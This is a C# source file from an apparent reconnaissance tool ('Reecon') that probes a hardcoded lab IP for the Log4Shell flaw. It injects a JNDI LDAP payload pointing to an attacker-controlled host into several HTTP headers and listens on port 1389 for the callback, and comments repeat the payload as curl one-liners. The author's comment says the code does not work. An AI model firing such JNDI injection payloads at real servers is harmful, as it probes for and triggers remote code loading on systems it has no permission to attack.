using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Reecon
{
    // This does not work at all.

    class Log4j
    {
        public static HttpClient httpClient = new HttpClient();
        private static CancellationTokenSource _cancellationTokenSource;
        private static Thread _thread;

        public static void Woof()
        {
            // curl http://10.10.157.215/ -H 'X-Api-Version: ${jndi:ldap://10.8.26.200:1389/a}'
            // curl http://10.10.157.215/ -H 'accept: ${jndi:ldap://10.8.26.200:1389/a}'
            TryDo("User-Agent");
            TryDo("Test");
            TryDo("accept");
            TryDo("Woofles");
        }

        public static void TryDo(string header)
        {
            Console.WriteLine("Starting with: " + header);
            _cancellationTokenSource = new CancellationTokenSource();
            // Thread thread = new Thread(new ParameterizedThreadStart(MyThread));
            _thread = new Thread(new ParameterizedThreadStart(MyThread));
            _thread.Start(header);
            string url = "http://10.10.157.215/";
            Uri theURL = new Uri(url);
            HttpRequestMessage httpClientRequest = new HttpRequestMessage(HttpMethod.Get, theURL);
            httpClientRequest.Headers.TryAddWithoutValidation(header, $"${{jndi:ldap://10.8.26.200:1389/a}}"); // 2 hacks in 1!
            HttpResponseMessage httpClientResponse = httpClient.Send(httpClientRequest);
            _cancellationTokenSource?.Cancel();
            Console.WriteLine("Killed thread");
        }

        private static void MyThread(object message)
        {
            while (!_cancellationTokenSource.Token.IsCancellationRequested)
            {

                string strMessage = message as string;

                int port = 1389;
                IPAddress localAddr = IPAddress.Parse("10.8.26.200");

                // TcpListener server = new TcpListener(port);
                TcpListener server = new TcpListener(localAddr, port);

                // Start listening for client requests.
                server.Start();
                if (_cancellationTokenSource.Token.IsCancellationRequested)
                {
                    server.Stop();
                    Console.WriteLine("Killed 1");
                    break;
                }
                while (true)
                {
                    if (_cancellationTokenSource.Token.IsCancellationRequested)
                    {
                        server.Stop();
                        Console.WriteLine("Killed 1");
                        break;
                    }
                    using TcpClient client = server.AcceptTcpClient();
                    Console.WriteLine("vulnerable with: " + strMessage);
                    if (_cancellationTokenSource.Token.IsCancellationRequested)
                    {
                        server.Stop();
                        Console.WriteLine("Killed 1");
                        break;
                    }
                }
                if (_cancellationTokenSource.Token.IsCancellationRequested)
                {
                    server.Stop();
                    Console.WriteLine("Killed 2");
                    break;
                }
            }
        }
    }
}
